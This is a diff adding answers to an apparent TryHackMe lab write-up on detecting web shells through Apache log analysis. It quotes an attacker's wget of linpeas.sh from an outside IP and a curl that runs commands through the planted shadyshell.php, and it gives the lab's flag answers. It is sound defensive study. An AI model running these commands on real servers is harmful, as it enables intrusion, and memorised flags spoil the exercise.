@@ -299,17 +299,54 @@ cat /var/log/apache2/access.log | grep "POST"
 ```
 
 <div align="center">
- 
+
+*Name of .php File*
+![.php file used to upload the web shell](https://github.com/amoham001/Write-Ups/blob/803f09bde693761050b1e78f054e77f02abb19bf/TryHackMe/Rooms/Detecting%20Web%20Shells/Screenshots/shady_uploadform.png)
 </div>
 
 
+> **Answer:** upload_form.php
+
 <h3>What is the first command run by the attacker using the newly uploaded web shell?</h3>
+
+Shortly after uploading the shadyshell.php via the upload form, the interaction between the shell and the attacker can be seen through the subsequent GET requests that followed.
+
+<div align="center">
+
+*First command run by attacker*
+![First command run by attacker](https://github.com/amoham001/Write-Ups/blob/803f09bde693761050b1e78f054e77f02abb19bf/TryHackMe/Rooms/Detecting%20Web%20Shells/Screenshots/found_shellinteraction.png)
+</div>
+
+> **Answer:** whoami
 
 <h3>After gaining access via the web shell, the attacker uses a command to download a second file onto the server. What is the name of this file?</h3>
 
+Using the above screen capture as a reference, at [17/Jul/2025:06:18:39 +0000], the attacker can be observed executing the following command, which downloads, what is assumed to be a persistence script.
+### Command
+```bash
+wget http://203.0.113.66:8000/linpeas.sh
+```
+> **Answer:** linpeas.sh
 
 <h3>The attacker has hidden a secret within the web shell. Use cat to investigate the web shell code and find the flag.</h3>
 
+Using the attacker's shell that was uploaded to the target server (Recall: shadyshell.php), I used the ls command to view the directory contents and low and behold, I found the flag!
 
+```bash
+curl http://10.64.135.10:8080/wordpress/wp-content/uploads/shadyshell.php?cmd=ls
+```
+<div align="center">
 
+*Flag #2 Acquired!*
+![Flag #2 Acquired](https://github.com/amoham001/Write-Ups/blob/803f09bde693761050b1e78f054e77f02abb19bf/TryHackMe/Rooms/Detecting%20Web%20Shells/Screenshots/flag2_acquired.png)
+</div>
 
+> **Answer:** THM{W3b_Sh3ll_Int3rnals}
+---
+<h3>End Note</h3>
+
+In this lab, I formed a solid understanding of detecting web shells using a combination of packet and network analysis. I felt I improved my ability in discerning traffic that is malicious from traffic that is benign.
+
+Thank you all for following along, I hope my walkthrough was helpful!
+
+You can find more of my walkthroughs <a href=https://github.com/amoham001/Write-Ups/tree/main/TryHackMe>here</a>
